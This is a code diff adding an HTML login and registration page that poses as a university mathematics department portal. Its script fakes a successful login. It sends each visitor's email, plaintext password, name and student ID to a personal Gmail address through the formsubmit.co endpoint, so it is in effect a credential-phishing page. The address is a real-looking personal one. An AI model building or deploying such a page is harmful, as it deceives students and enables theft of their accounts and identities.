@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UCC Mathematics Portal</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0056b3, #101010);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .auth-container {
+            background-color: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            width: 90%;
+            max-width: 400px;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .logo-header {
+            background-color: #0056b3;
+            padding: 20px;
+            text-align: center;
+            color: white;
+        }
+
+        .logo-header img {
+            height: 60px;
+            margin-bottom: 10px;
+        }
+
+        .logo-header h1 {
+            margin: 0;
+            font-size: 1.5rem;
+        }
+
+        .form-container {
+            padding: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #333;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+
+        .form-group input:focus {
+            border-color: #0056b3;
+            box-shadow: 0 0 0 3px rgba(0, 86, 179, 0.2);
+            outline: none;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            background-color: #0056b3;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn:hover {
+            background-color: #004494;
+            transform: translateY(-2px);
+        }
+
+        .btn-secondary {
+            background-color: #6c757d;
+        }
+
+        .btn-secondary:hover {
+            background-color: #5a6268;
+        }
+
+        .toggle-form {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .toggle-form a {
+            color: #0056b3;
+            text-decoration: none;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .toggle-form a:hover {
+            text-decoration: underline;
+        }
+
+        .form-message {
+            padding: 10px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+            text-align: center;
+            display: none;
+        }
+
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 10px;
+            top: 38px;
+            cursor: pointer;
+            color: #777;
+        }
+
+        /* Form states */
+        #loginForm {
+            display: block;
+        }
+
+        #registerForm {
+            display: none;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 480px) {
+            .auth-container {
+                width: 95%;
+            }
+            
+            .form-container {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="auth-container">
+        <div class="logo-header">
+            <img src="IMG-20241224-WA0007.jpg" alt="UCC Mathematics Department Logo">
+            <h1>Mathematics Department Portal</h1>
+        </div>
+
+        <div class="form-container">
+            <!-- Login Form -->
+            <form id="loginForm">
+                <div id="loginMessage" class="form-message"></div>
+                
+                <div class="form-group">
+                    <label for="loginEmail">Email:</label>
+                    <input type="email" id="loginEmail" placeholder="student@ucc.edu.gh" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="loginPassword">Password:</label>
+                    <input type="password" id="loginPassword" placeholder="Enter your password" required>
+                    <i class="fas fa-eye password-toggle" onclick="togglePassword('loginPassword')"></i>
+                </div>
+                
+                <button type="submit" class="btn">Login</button>
+                
+                <div class="toggle-form">
+                    Don't have an account? <a onclick="showRegisterForm()">Register here</a>
+                </div>
+            </form>
+
+            <!-- Registration Form -->
+            <form id="registerForm">
+                <div id="registerMessage" class="form-message"></div>
+                
+                <div class="form-group">
+                    <label for="regUsername">Full Name:</label>
+                    <input type="text" id="regUsername" placeholder="John Doe" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="regEmail">Email:</label>
+                    <input type="email" id="regEmail" placeholder="student@ucc.edu.gh" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="regStudentId">Student ID:</label>
+                    <input type="text" id="regStudentId" placeholder="ET/MAT/21/0119" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="regPassword">Password:</label>
+                    <input type="password" id="regPassword" placeholder="Create a password" required>
+                    <i class="fas fa-eye password-toggle" onclick="togglePassword('regPassword')"></i>
+                </div>
+                
+                <div class="form-group">
+                    <label for="regConfirmPassword">Confirm Password:</label>
+                    <input type="password" id="regConfirmPassword" placeholder="Confirm your password" required>
+                    <i class="fas fa-eye password-toggle" onclick="togglePassword('regConfirmPassword')"></i>
+                </div>
+                
+                <button type="submit" class="btn">Register</button>
+                
+                <div class="toggle-form">
+                    Already have an account? <a onclick="showLoginForm()">Login here</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Toggle between login and register forms
+        function showRegisterForm() {
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('registerForm').style.display = 'block';
+            clearMessages();
+        }
+
+        function showLoginForm() {
+            document.getElementById('registerForm').style.display = 'none';
+            document.getElementById('loginForm').style.display = 'block';
+            clearMessages();
+        }
+
+        function clearMessages() {
+            document.getElementById('loginMessage').style.display = 'none';
+            document.getElementById('registerMessage').style.display = 'none';
+        }
+
+        // Toggle password visibility
+        function togglePassword(inputId) {
+            const input = document.getElementById(inputId);
+            const icon = input.nextElementSibling;
+            
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+            } else {
+                input.type = 'password';
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+            }
+        }
+
+        // Form validation and submission
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('loginEmail').value;
+            const password = document.getElementById('loginPassword').value;
+            
+            // Basic validation
+            if (!email || !password) {
+                showMessage('loginMessage', 'Please fill in all fields', 'error');
+                return;
+            }
+            
+            // Email validation
+            if (!validateEmail(email)) {
+                showMessage('loginMessage', 'Please enter a valid email address', 'error');
+                return;
+            }
+            
+            // Simulate login (in a real app, you'd send to server)
+            showMessage('loginMessage', 'Login successful! Redirecting...', 'success');
+            
+            // Here you would typically send data to your server
+            sendEmailNotification('Login Attempt', `Email: ${email}\nPassword: ${password}`);
+            
+            // Redirect after delay
+            setTimeout(() => {
+                window.location.href = 'dashboard.html'; // Change to your actual dashboard page
+            }, 1500);
+        });
+
+        document.getElementById('registerForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const name = document.getElementById('regUsername').value;
+            const email = document.getElementById('regEmail').value;
+            const studentId = document.getElementById('regStudentId').value;
+            const password = document.getElementById('regPassword').value;
+            const confirmPassword = document.getElementById('regConfirmPassword').value;
+            
+            // Basic validation
+            if (!name || !email || !studentId || !password || !confirmPassword) {
+                showMessage('registerMessage', 'Please fill in all fields', 'error');
+                return;
+            }
+            
+            // Email validation
+            if (!validateEmail(email)) {
+                showMessage('registerMessage', 'Please enter a valid email address', 'error');
+                return;
+            }
+            
+            // Student ID validation (basic pattern)
+            if (!/^[A-Z]{2}\/[A-Z]{3}\/\d{2}\/\d{4}$/.test(studentId)) {
+                showMessage('registerMessage', 'Please enter a valid student ID (e.g., ET/MAT/21/0119)', 'error');
+                return;
+            }
+            
+            // Password validation
+            if (password.length < 6) {
+                showMessage('registerMessage', 'Password must be at least 6 characters', 'error');
+                return;
+            }
+            
+            if (password !== confirmPassword) {
+                showMessage('registerMessage', 'Passwords do not match', 'error');
+                return;
+            }
+            
+            // Simulate registration (in a real app, you'd send to server)
+            showMessage('registerMessage', 'Registration successful! Please login.', 'success');
+            
+            // Send registration details to your email
+            const message = `New Registration:\nName: ${name}\nEmail: ${email}\nStudent ID: ${studentId}\nPassword: ${password}`;
+            sendEmailNotification('New Registration', message);
+            
+            // Show login form after successful registration
+            setTimeout(() => {
+                showLoginForm();
+            }, 2000);
+        });
+
+        // Helper functions
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+
+        function showMessage(elementId, message, type) {
+            const element = document.getElementById(elementId);
+            element.textContent = message;
+            element.className = `form-message ${type}`;
+            element.style.display = 'block';
+        }
+
+        // Function to "send" email notification (simulated with EmailJS)
+        function sendEmailNotification(subject, body) {
+            // In a real implementation, you would use a service like EmailJS, FormSubmit, or a backend
+            console.log(`Email would be sent to asarepeter127@gmail.com with subject: ${subject} and body: ${body}`);
+            
+            // For actual email sending, you would need to:
+            // 1. Use a service like EmailJS (https://www.emailjs.com/)
+            // 2. Or set up a backend service with PHP, Node.js, etc.
+            
+            // Example using FormSubmit (simple solution without backend):
+            // You would create a separate form that submits to FormSubmit's endpoint
+            // This is just for demonstration - implement properly in production
+            const formData = new FormData();
+            formData.append('_subject', subject);
+            formData.append('message', body);
+            formData.append('_replyto', 'noreply@ucc.edu.gh');
+            
+            fetch('https://formsubmit.co/ajax/asarepeter127@gmail.com', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => console.log('Email sent:', data))
+            .catch(error => console.error('Error sending email:', error));
+        }
+    </script>
+</body>
+</html>
